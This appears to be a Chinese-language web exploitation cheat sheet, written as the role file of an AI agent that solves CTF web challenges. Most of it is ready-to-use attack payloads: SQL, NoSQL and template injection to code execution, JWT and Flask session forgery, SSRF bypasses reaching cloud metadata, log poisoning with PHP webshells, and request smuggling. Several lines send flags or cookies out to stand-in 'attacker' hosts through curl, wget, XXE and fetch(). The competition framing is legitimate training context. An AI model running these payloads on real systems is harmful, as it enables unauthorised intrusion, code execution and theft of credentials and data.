# Web Agent — 技术速查

> **适用版本**: PHP 7.x-8.x, Node.js 16+, Python Flask/Django, Java Spring Boot

## Mission
Web 安全审计与利用：源码审计、端点枚举、低速率交互、模板/序列化/认证/注入利用。

## When Selected
- HTTP URL / Web 源码
- session/auth/template/file/injection 逻辑
- 部署了 Web 服务的挑战

---

## First Pass

1. 确认攻击面：source only / endpoint only / both
2. 路由/模板/认证/存储/密钥/框架约定 mapping
3. 判断 solve path：代码审计、模板注入、文件路径、认证缺陷、注入、SSRF/反序列化

---

## 频率限制（必须遵守）

- 每次请求间隔 ≥ 0.5~1 秒
- 目录爆破间隔 ≥ 0.3 秒
- 单目标 ≤ 500 次/分钟
- 用 `time.sleep()` 控制

---

## 源码审计 (Static Analysis)

### 审计路线
`依赖/配置 → 路由总览 → 鉴权检查 → 输入追踪 → 敏感操作 → 存储/输出`

```bash
# 硬编码密钥/凭证
grep -rn 'secret\|password\|api_key\|SECRET' --include='*.py' --include='*.js' --include='*.php' --include='*.yml' --include='*.env' .

# 路由总览（对比路由表与鉴权中间件，找遗漏）
# Flask:  grep -rn '@app.route\|@app.get\|@app.post' --include='*.py' .
# Express: grep -rn 'app\.\(get\|post\|put\|delete\|use\)' --include='*.js' .
# Spring:  grep -rn '@RequestMapping\|@GetMapping\|@PostMapping' --include='*.java' .
# PHP:     grep -rn 'Route::\|$app->get\|$app->post' --include='*.php' .

# 危险函数（输入到执行路径搜索）
# Python: eval/exec/os.system/subprocess/pickle/__import__/compile
# PHP:    system/exec/shell_exec/eval/include/unserialize/preg_replace
# Node:   eval/child_process/execSync/vm.runInNewContext/Function()

# 调试/管理端点
grep -rn 'debug\|admin\|dev\|test\|backup\|console\|swagger\|api/doc' .

# 框架泄漏检查
# Flask: debug=True → /console Werkzeug 调试器
# Spring: /actuator/env, /actuator/heapdump, /actuator/beans
# Laravel: /_ignition, .env 可读
```

**核心原则**: 有源码不盲注，先静态定位漏洞路径再手工验证；关注配置与代码的不一致（如中间件遗漏动态路由）

---

## 核心技术

### 信息收集
```bash
# 目录扫描
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -t 10 --delay 300ms
ffuf -u http://target/FUZZ -w wordlist.txt -rate 100

# Git 泄露
curl -s http://target/.git/HEAD
# 工具: git-dumper, GitHack

# 响应头分析
curl -v http://target/ 2>&1 | grep -iE '(server|x-powered|set-cookie)'
```

### SQL 注入
```bash
# 自动化
sqlmap -u "http://target/api?id=1" --batch --dbs

# 手动检测
' OR 1=1 --
' UNION SELECT 1,2,3 --
" AND SLEEP(5) --
```

### NoSQL 注入 (MongoDB)
```bash
# 检测 — 修改 JSON/URL 参数为操作符
# JSON:  {"password": {"$ne": ""}}       → 返回所有记录
# URL:   password[$ne]=                  → Express 解析为操作符
# JSON:  {"password": {"$regex": "^f"}}  → 盲注逐字符

# 登录绕过
username=admin&password[$ne]=

# $where 注入 (JavaScript 执行)
{"$where": "this.isAdmin"}
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/^f.*/)"}

# 字段枚举
{"$where": "Object.keys(this)[1].match('^.{1}.*')"}

# 嵌套 $where 绕过 (CVE-2025-23061)
{"$and": [{"$where": "this.isAdmin"}]}   # 绕过简单 $where 黑名单
```

### SSTI (模板注入)
```bash
# 检测
{{7*7}}  →  49 → Jinja2/Twig
${7*7}   →  49 → Freemarker/Velocity
#{7*7}   →  49 → Spring EL

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Fenjing 自动绕过 (检查 workspace.json 获取路径)
fenjing scan -u http://target/ -p 'name'
```

### JWT 攻击
```bash
# 解码头部和负载
python3 -c "import jwt; print(jwt.decode(open('token').read(), options={'verify_signature':False}))"
# 在线: https://jwt.io

# 密钥爆破 (jwt_tool / hashcat)
jwt_tool TOKEN -C -d wordlist.txt
hashcat -m 16500 jwt.txt wordlist.txt

# 算法混淆 (RS256→HS256) — 用公钥验证的 HS256 token
jwt_tool TOKEN -X a -pk public.pem

# None 算法 — alg 设为 none/Nona
jwt_tool TOKEN -X a
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, '', algorithm='none'))"

# JWK Injection — 注入攻击者控制的公钥 (jwk 头)
python3 jwt_tool.py TOKEN -X i

# kid 注入 — kid 头注入路径遍历/SQLi
# kid: "../../../dev/null" → 密钥读为空 → 用空字符串验证
# golang: kid: "keyfile; whoami" → 命令执行 (某些库)

# jku/x5u 注入 — 将 jku 指向攻击者托管的 JWKS 端点
# 1) 生成 RSA 密钥对  2) 托管 JWKS 在自建服务器  3) 修改头部 "jku":"http://attacker/jwks.json"

# ES256 临时密钥恢复 — 当 ECDSA k 重用或可预测时恢复私钥
```

### Flask Session 伪造
```bash
# Flask session 格式: base64(JSON).timestamp.HMAC-SHA1

# 解码 (无需密钥)
flask-unsign --decode --cookie 'eyJ1c2VyIjoiZ3Vlc3QifQ.ZxYzAb.abc123'

# 密钥爆破
flask-unsign --unsign --cookie 'TOKEN' --wordlist rockyou.txt

# 伪造 session
flask-unsign --sign --cookie "{'user':'admin'}" --secret 'KEY'

# 手工伪造 (Python)
python3 -c "
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
s = URLSafeTimedSerializer('KEY', salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer_kwargs={'key_derivation':'hmac','digest_method':hashlib.sha1})
print(s.dumps({'user':'admin'}))
"

# 常见弱密钥: 'secret', 'password1', 'secret_key', 'supersecret'
```

### SSRF / 文件读取
```bash
# PHP filter wrapper
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=flag.php

# data:// scheme (代码执行)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

# SSRF 常见绕过 (127.0.0.1 等价形式)
http://0x7f000001      # 十六进制 IP
http://2130706433      # 十进制 IP
http://0177.0.0.1      # 八进制
http://[::1]           # IPv6 localhost
http://0.0.0.0         # 全零 → 多数系统映射 localhost
http://127.127.127.127 # 掩码效应 → 等同 127.0.0.1

# DNS Rebinding — 首次解析指向白名单，第二次指向内网
# xip.io/nip.io/sslip.io 通配符
http://target.127.0.0.1.nip.io:8080/admin

# Redirect Bypass — 白名单服务器 302 跳转到内网
curl -v http://target/redirect?url=http://169.254.169.254/latest/meta-data/  # 检查是否跟随

# Gopher 协议 — 与任意 TCP 服务交互 (Redis/MySQL 未授权)
# Redis 写 crontab RCE:  gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...
# 工具: Gopherus (自动生成 Redis/MySQL/FastCGI payload)

# URL 解析器不一致绕过 (不同语言解析差异)
http://allowed.com@internal:8080   # @ 前为 credentials, 某些库忽略 host
http://internal:8080#@allowed.com  # # 后为 fragment, 某些库不发送
http://allowed.com\@internal:8080  # 反斜杠在 curl 中等价 /

# 云元数据
# AWS:   http://169.254.169.254/latest/meta-data/
# GCP:   http://metadata.google.internal/computeMetadata/v1/
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Blind SSRF — 无回显时的检测
# HTTP 外带: curl http://attacker-log/$RANDOM
# DNS 外带:  curl http://$(cat /flag | base64).attacker.com
# 延时:      curl http://127.0.0.1:8080/slow (对比响应时间)
```

### LFI 到 RCE (日志注入)
```bash
# 1. Apache/Nginx 日志注入 (最常用)
curl --user-agent "<?php system(\$_GET['cmd']); ?>" http://target/
# 日志路径: /var/log/apache2/access.log  /var/log/nginx/access.log
curl "http://target/lfi.php?file=../../../var/log/apache2/access.log&cmd=id"

# 2. /proc/self/environ (User-Agent 写入 environ)
curl --user-agent "<?php system('id'); ?>" http://target/
curl "http://target/lfi.php?file=../../../proc/self/environ"

# 3. /proc/self/fd (遍历 fd 找到对应日志)
for i in $(seq 0 20); do curl "http://target/lfi.php?file=/proc/self/fd/$i&cmd=id"; done

# 4. PHP Session 注入 (session.upload_progress)
# 文件: /tmp/sess_<SESSION_ID> 或 /var/lib/php/sessions/sess_<SESSION_ID>

# 5. SSH auth.log 注入
echo '<?php system($_GET["cmd"]); ?>' | nc target 22
curl "http://target/lfi.php?file=../../../var/log/auth.log&cmd=id"
```

### XXE (XML External Entity)
```xml
<!-- 基本文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>

<!-- 带外 OOB -->
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>
<!-- evil.dtd: <!ENTITY % data SYSTEM "file:///flag">
     <!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%data;'>">
     %send; %exfil; -->

<!-- PHP base64 绕过 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
```

### Command Injection
```bash
# 常见注入点：ping/whois/nslookup 输入框
; id
| id
`id`
$(id)
%0aid

# 无回显 — 带外
; curl http://attacker/$(cat /flag | base64)
; wget http://attacker/?f=$(cat /flag)

# 绕过空格过滤
cat${IFS}/flag
cat<>/flag
{cat,/flag}
```

### File Upload Bypass
```bash
# 扩展名绕过
.php → .pHp / .php5 / .phtml / .phar
.jsp → .jspx / .jsw
# 双扩展: shell.php.jpg（Apache 解析漏洞）
# 空字节: shell.php%00.jpg（PHP <5.3）

# Content-Type 绕过
Content-Type: image/png  # 但内容是 PHP webshell

# .htaccess 上传
AddType application/x-httpd-php .jpg

# 图片马
cat image.png shell.php > merged.php
# 或 GIF 头：GIF89a<?php system($_GET['c']); ?>
```

### GraphQL
```bash
# Introspection
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# 枚举 queries/mutations
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name } } } } } }"}'

# Batch query（绕过 rate limit）
[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"}]

# 常见漏洞：IDOR, 认证绕过, Timing Oracle
```

### Race Condition / TOCTOU
```python
import threading, requests

url = "http://target/transfer"
data = {"to": "attacker", "amount": 1000}

def race():
    requests.post(url, data=data)

# 并发发送
threads = [threading.Thread(target=race) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
# 检查余额是否异常
```

### Prototype Pollution (Node.js)
```json
// 污染 Object.prototype
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// 常见利用：Handlebars RCE, EJS RCE
// Handlebars: "__proto__" → 注入 template helpers
```

### Server-Side Prototype Pollution
```javascript
// 与客户端 PP 不同，服务端 PP 可直接 RCE
// 检测：改变响应行为（status code, headers, charset）

// EJS RCE via PP (经典 CTF 考点)
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug/Jade RCE via PP
{"__proto__": {"block": {"type": "Text", "val": "x]});process.mainModule.require('child_process').execSync('id');//"}}}

// 检测技巧（不触发 RCE）
{"__proto__": {"status": 510}}   // 响应码变 510 → PP 存在
{"__proto__": {"content-type": "text/plain"}}  // Content-Type 变化
```

### Web Cache Poisoning / Deception
```bash
# 检测缓存 — 观察响应头
curl -sI http://target/ | grep -iE 'x-cache|x-served-by|x-cache-status'

# Cache Key 混淆 — 未 key 的参数/header 可注入
# X-Forwarded-Host: evil.com  → 缓存生成含 evil.com 链接的响应

# Web Cache Deception — 让缓存认为请求的是静态资源
curl http://target/account/profile.css    # 缓存含用户信息的页面
curl http://target/account;profile.css    # 分号路径混淆
curl http://target/account/..%2Fprofile.css  # 路径穿越

# Body-forwarding Poisoning (GET body 未被 key)
curl -X GET http://target/search?q=ok -d 'q=<script>alert(1)</script>'
```

### HTTP Request Smuggling
```bash
# CL-TE (前端用 Content-Length, 后端用 Transfer-Encoding)
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc target 80

# TE-CL (前端用 Transfer-Encoding, 后端用 Content-Length)
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | nc target 80

# TE-TE (两端都用 TE, 但 obfuscate 头让一端忽略)
Transfer-Encoding: chunked
Transfer-Encoding: cow        # 后端可能不识别 → fallback CL
Transfer-Encoding : chunked   # 注意空格
Transfer-Encoding: chunked\r\nTransfer-encoding: x

# H2C Smuggling (HTTP/2 cleartext 升级)
# 前端不处理 HTTP/2 但透传 Upgrade → 后端接受 → 绕过前端 ACL
curl -X POST http://target/ \
  -H "Upgrade: h2c" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA"

# 检测工具
python3 smuggler.py -u http://target/
```

### CSS 数据外泄
```css
// 属性选择器外泄 — 逐字符通过 background 回传
input[value^="f"] { background: url(http://attacker/f); }
input[value^="fl"] { background: url(http://attacker/fl); }

// hidden 输入用 ~ 兄弟选择器绕过
input[name=token][value^="a"] ~ * { background: url(http://attacker/a); }

// @import 链式外泄 (避免重复加载)
@import url(//attacker/start);

// 字体连字外泄 — 泄露 text node 内容
@font-face { font-family: x; src: url(//attacker/font); }
body { font-family: x; }
```

### DOM Clobbering
```html
// 用 HTML 元素覆盖 JS 变量
<a id="isAdmin">                          // window.isAdmin → truthy
<form id="browser"><input name="runtime"></form>  // browser.runtime → 嵌套访问

// 覆盖 setTimeout 回调 (绕过 CSP)
// JS: setTimeout(ok, 2000)  →  <a id="ok" href="javascript:alert(1)">

// 覆盖安全检查变量 (配合 DOMPurify 绕过)
// JS: if (isDevelopment) { useExternalLogger(); }
<form id="isDevelopment"><base href="http://attacker/"></form>
```

### WebSocket 攻击
```python
# Cross-Site WebSocket Hijacking (CSWSH)
# 如果 WebSocket 握手不验证 Origin → 跨域劫持
import websocket
ws = websocket.WebSocket()
ws.connect("ws://target/ws",
    origin="http://evil.com",
    cookie="session=stolen_token")
ws.send('{"action":"getFlag"}')
print(ws.recv())

# WebSocket 消息注入
# 如果 ws 消息被拼接到 SQL/命令 → 注入
ws.send('{"user":"admin\' OR 1=1--"}')

# WebSocket 中间人 (代理调试)
# 使用 websocat: websocat -v ws://target/ws
```

### SSTI 深度绕过 (Jinja2)
```python
# 过滤了 . (点号)
# 使用 attr() 或 [] 替代
{{ config|attr('__class__') }}
{{ config['__class__'] }}

# 过滤了 _ (下划线)
# 使用 request 对象或 hex 编码
{{ config['\x5f\x5fclass\x5f\x5f'] }}
{{ config|attr(request.args.a) }}  # ?a=__class__

# 过滤了 {{ }} — 使用 {% %} 带外
{% if config.__class__.__init__.__globals__['os'].popen('curl attacker/?f='~flag).read() %}{% endif %}

# 过滤了引号
{{ config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read() }}
# URL: ?a=os&b=cat /flag

# 拼接字符串 (无引号无加号)
{% set a=dict(o=x,s=x)|join %}  →  "os"
{% set b=dict(po=x,pen=x)|join %}  →  "popen"
```

### PHP 反序列化 (POP Chain)
```php
// phar:// 反序列化 (不需要 unserialize 入口)
// 文件操作函数 (file_exists, is_file, fopen...) + phar:// → 触发反序列化
// 构造: 上传含恶意序列化数据的 phar 文件
// 触发: file_exists("phar://uploads/evil.phar/test")

// PHP POP Chain 构造思路:
// 1. 找 __destruct/__wakeup 入口类
// 2. 追踪方法调用链 (magic → sink)
// 3. 寻找文件写入/命令执行/SSRF sink
// 4. 设置属性值使链条连通
```

### CORS Misconfiguration
```bash
# 检测
curl -v -H "Origin: http://evil.com" http://target/api/user 2>&1 | grep -i access-control
# 如果返回 Access-Control-Allow-Origin: http://evil.com 且 Allow-Credentials: true
# → 可以跨域窃取用户数据
```

### PHP 特性
```php
// str_replace 单次替换绕过
str_replace("flag", "", $input)  →  "flflagag" → "flag"

// 弱比较
0 == "any_string"    // true (PHP <8)
"0e12345" == "0e67890"  // true (MD5 碰撞)

// file_get_contents + php://
file_get_contents("php://input")  // 读 POST body
```

### PHP Filter Chain RCE (无文件 RCE)
```bash
# 原理: 链式 php://filter 从空流中"雕刻"出 PHP 代码
# 场景: LFI + 日志不可写 + allow_url_include=Off

# 安装生成器
git clone https://github.com/synacktiv/php_filter_chains_generator.git
cd php_filter_chains_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'

# 利用 (输出 php://filter/... 链)
curl "http://target/lfi.php?page=<生成的filter链>&c=id"
```

### 反序列化
```python
# Python Pickle RCE
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())))
```

### XSS
```javascript
// 基本检测
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Cookie 外带
<script>fetch('http://attacker/?c='+document.cookie)</script>
```

### OAuth 2.0
```bash
# redirect_uri 绕过
https://app.com/callback@evil.com          # @ 前是正确域，某些库忽略
https://app.com/callback/../evil            # 路径穿越
https://evil.app.com/callback               # 子域名白名单
https://app.com/callback?redirect=evil.com  # 开放重定向
https://app.com/callback?redirect_uri=evil  # 参数污染

# state CSRF — state 缺失或可预测 → 攻击者可绑定受害者账号
# 检测: 移除 state 或使用固定值 → 若成功则存在漏洞

# client_secret 泄露
# 前端 JS、APK 反编译、Git 仓库 (.env/config) 中硬编码
# 泄露后可伪造授权请求换取 token

# 授权码拦截 (Referer Leak)
# OAuth 回调页加载第三方资源 → 授权码在 Referer 中泄露

# token 绑定不足 — access_token 未绑定 client_id → 可被第三方窃取使用

# OpenID Connect 常见问题
# nonce 不验证 → 可重放 (受限于 token 有效期)
# iss/sub 不验证 → 跨租户 token 复用
```

---

## Spring Boot Actuator

```bash
# 探测
curl -s http://target/actuator/ | jq
curl -s http://target/actuator/env | jq
curl -s http://target/actuator/heapdump -o heapdump

# SB-Actuator 自动利用
python3 tools/SB-Actuator/SBScan.py -u http://target/
```

---

## Escalation

需要 `misc-agent` 当：
- PCAP/日志/编码 blob 主导下一步
- 需要 solve 非 web 层的文件变换

需要 `crypto-agent` 当：
- JWT 自定义签名方案
- 加密 cookie/token 需要密码学分析

---

## 请求脚本模板

```python
import requests

s = requests.Session()
url = "http://target:port"

# Login
s.post(f"{url}/login", data={"user": "admin", "pass": "admin"})

# Exploit
r = s.get(f"{url}/flag", cookies=s.cookies)
print(r.text)
```
